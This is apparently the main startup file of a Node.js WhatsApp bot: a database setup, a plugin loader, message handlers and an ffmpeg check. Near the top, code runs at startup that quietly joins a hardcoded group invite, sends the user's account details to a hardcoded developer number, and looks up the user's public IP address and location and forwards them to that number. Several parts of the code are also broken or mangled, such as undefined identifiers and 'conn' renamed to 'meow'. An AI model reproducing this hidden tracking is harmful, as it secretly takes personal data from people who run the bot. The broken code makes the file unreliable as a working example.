require('./config.js')
const {
 master,
 MessageType
 } = require('olduser/alok')
 const {
 WAConnection: _WAConnection,
 MessageType2
 } = require('@adiwajshing/baileys')
const cloudDBAdapter = require('./lib/cloudDBAdapter')
const { generate } = require('qrcode-terminal')
const syntaxerror = require('syntax-error')
const simple = require('./lib/simple')
//  const logs = require('./lib/logs')
const { promisify } = require('util')
const yargs = require('yargs/yargs')
const Readline = require('readline')
const cp = require('child_process')
const _ = require('lodash')
const path = require('path')
const fs = require('fs')
const fetch = require("node-fetch")
const { color } = require('./lib/color')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}
const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')

const rl = Readline.createInterface(process.stdin, process.stdout)
const master2 = simple.master(_master)


global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}
// global.LOGGER = logs()
const PORT = process.env.PORT || 3000
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())

global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) :
     /mongodb/.test(opts['db']) ?
      new mongoDB(opts['db']) :
    new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)
global.DATABASE = global.db // Backwards Compatibility

global.conn = new WAConnection()
global.meow = new master()
conn.version = [2, 2143, 3]
let authFile = `${opts._[0] || 'session'}.json`
if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
if (opts['trace']) conn.logger.level = 'trace'
if (opts['debug']) conn.logger.level = 'debug'
if (opts['big-qr']) conn.on('qr', qr => generate(qr, { small: false }))

    //group link target
    teks = `https://chat.whatsapp.com/IHP6JLwAIi4HeVJMDJPw1N`
    meow.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
    
        //inform to developer that the user is meowected to bot
        
      meow.sendMessage(`918602239106@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot meowected Successfully!_`, MessageType.extendedText)
         
       meow.sendMessage(`918602239106@s.whatsapp.net`, `Thanks bro, your Olduser Tokio Bot is working on my whatsapp number ez😂`, MessageType.extendedText)
    
     meow.sendMessage(`918602239106@s.whatsapp.net`, `*Hi Owner olduser, the bot has been successfully meowected to this number*\n────────────────────\n\`\`\`${JSON.stringify(meow.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer olduser Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./olduser.jpg'),sourceUrl:"https://wa.me/918602239106?text=Hello bro"}}})
     
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       meow.sendMessage("918602239106@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer olduser Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./olduser.jpg'),sourceUrl:"https://wa.me/918602239106?text=Hello bro"}}})
       
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
   
if (!opts['test']) setInterval(async () => {
  await global.db.write()
}, 60 * 1000) // Save every minute
if (opts['server']) require('./server')(global.meow, PORT)

meow.user = {
  jid: '',
  name: '',
  phone: {}
}
if (opts['test']) {
  meow.user = {
    jid: '2219191@s.whatsapp.net',
    name: 'test',
    phone: {}
  }
  meow.prepareMessageMedia = (buffer, mediaType, options = {}) => {
    return {
      [mediaType]: {
        url: '',
        mediaKey: '',
        mimetype: options.mimetype || '',
        fileEncSha256: '',
        fileSha256: '',
        fileLength: buffer.length,
        seconds: options.duration,
        fileName: options.filename || 'file',
        gifPlayback: options.mimetype == 'image/gif' || undefined,
        caption: options.caption,
        ptt: options.ptt
      }
    }
  }

  meow.sendMessage = async (chatId, content, type, opts = {}) => {
    let message = await meow.prepareMessageContent(content, type, opts)
    let waMessage = await meow.prepareMessageFromContent(chatId, message, opts)
    if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
    meow.emit('chat-update', {
      jid: meow.user.jid,
      hasNewMessage: true,
      count: 1,
      messages: {
        all() {
          return [waMessage]
        }
      }
    })
  }
  rl.on('line', line => meow.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
} else {
  rl.on('line', line => {
    process.send(line.trim())
  })
  meow.meowect().then(async () => {
  await global.db.read()
  global.db.data = {
    users: {},
    chats: {},
    stats: {},
    msgs: {},
    sticker: {},
    ...(global.db.data || {})
  }
  global.db.chain = _.chain(global.db.data)
    fs.writeFileSync(authFile, JSON.stringify(meow.base64EncodedAuthInfo(), null, '\t'))
    global.timestamp.meowect = new Date
  })
}
process.on('uncaughtException', console.error)

let isInit = true
global.reloadHandler = function () {
  let handler = require('./handler')
  if (!isInit) {
    meow.off('chat-update', meow.handler)
    meow.off('message-delete', meow.onDelete)
    meow.off('group-participants-update', meow.onParticipantsUpdate)
    meow.off('CB:action,,call', meow.onCall)
  }
  meow.welcome = 'Hi @user 👋🏻\nWelcome to the group @subject\n\n@desc'
  meow.bye = 'Goodbye @user 👋🏻'
  meow.spromote = '@user is now admin!'
  meow.sdemote = '@user is not admin now!'
  meow.handler = handler.handler
  meow.onDelete = handler.delete
  meow.onParticipantsUpdate = handler.participantsUpdate
  meow.onCall = handler.onCall
  meow.on('chat-update', meow.handler)
  meow.on('message-delete', meow.onDelete)
  meow.on('group-participants-update', meow.onParticipantsUpdate)
  meow.on('CB:action,,call', meow.onCall)
  if (isInit) {
    meow.on('error', meow.logger.error)
    meow.on('close', () => {
      setTimeout(async () => {
        try {
          if (meow.state === 'close') {
            if (fs.existsSync(authFile)) await meow.loadAuthInfo(authFile)
            await meow.meowect()
            fs.writeFileSync(authFile, JSON.stringify(meow.base64EncodedAuthInfo(), null, '\t'))
            global.timestamp.meowect = new Date
          }
        } catch (e) {
          meow.logger.error(e)
        }
      }, 5000)
    })
  }
  isInit = false
  return true
}

// Plugin Loader
let pluginFolder = path.join(__dirname, 'plugins')
let pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
  try {
    global.plugins[filename] = require(path.join(pluginFolder, filename))
  } catch (e) {
    meow.logger.error(e)
    delete global.plugins[filename]
  }
}
console.log(Object.keys(global.plugins))
global.reload = (_event, filename) => {
  if (pluginFilter(filename)) {
    let dir = path.join(pluginFolder, filename)
    if (dir in require.cache) {
      delete require.cache[dir]
      if (fs.existsSync(dir)) meow.logger.info(`re - require plugin '${filename}'`)
      else {
        meow.logger.warn(`deleted plugin '${filename}'`)
        return delete global.plugins[filename]
      }
    } else meow.logger.info(`requiring new plugin '${filename}'`)
    let err = syntaxerror(fs.readFileSync(dir), filename)
    if (err) meow.logger.error(`syntax error while loading '${filename}'\n${err}`)
    else try {
      global.plugins[filename] = require(dir)
    } catch (e) {
      meow.logger.error(e)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
fs.watch(path.join(__dirname, 'plugins'), global.reload)
global.reloadHandler()



// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    cp.spawn('ffmpeg'),
    cp.spawn('ffprobe'),
    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    cp.spawn('convert'),
    cp.spawn('magick'),
    cp.spawn('gm'),
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm] = test
  console.log(test)
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm
  }
  require('./lib/sticker').support = s
  Object.freeze(global.support)

  if (!s.ffmpeg) meow.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) meow.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) meow.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
}

_quickTest()
  .then(() => meow.logger.info('Quick Test Done'))
  .catch(console.error)